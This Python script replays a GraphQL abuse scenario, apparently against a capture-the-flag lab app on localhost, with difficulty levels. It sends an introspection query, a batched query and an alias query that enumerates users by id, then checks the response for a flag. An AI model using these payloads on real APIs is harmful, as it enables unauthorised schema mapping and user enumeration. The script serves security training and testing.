#!/usr/bin/env python3
"""Replay the graphql-abuse scenario. Standard library only."""
import json
import sys
import urllib.error
import urllib.request

def _post_json(base, path, data):
    url = base.rstrip("/") + path
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")

def attack(base, level):
    if level == "low":
        body = {"query": "{ __schema { types { name } } }"}
    elif level == "medium":
        body = [{"query": "{ me { username } }"}, {"query": "{ status }"}]
    elif level == "high":
        body = {"query": "{ a1: user(id: 1) { name }, a2: user(id: 2) { name }, a3: user(id: 3) { name }, a4: user(id: 4) { name } }"}
    else:
        body = {"query": "{ __schema { types { name } } }"}

    status, data = _post_json(base, "/api/graphql", body)
    print(f"  POST /api/graphql ({level}) -> HTTP {status}")
    flag = None
    if isinstance(data, dict):
        flag = data.get("flag")
    elif isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict):
        flag = data[0].get("flag")

    if flag:
        print(f"  ✓ Exploited successfully! 🚩 Flag: {flag}")
        return True
    elif status == 200 and not (isinstance(data, dict) and "errors" in data):
        print("  ✓ Query succeeded (no flag returned)")
        return True
    print(f"  ✗ Rejected or blocked: {data}")
    return False

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl = sys.argv[2] if len(sys.argv) > 2 else "low"
    print(f"[graphql-abuse] {base} level={lvl}")
    sys.exit(0 if attack(base, lvl) else 1)
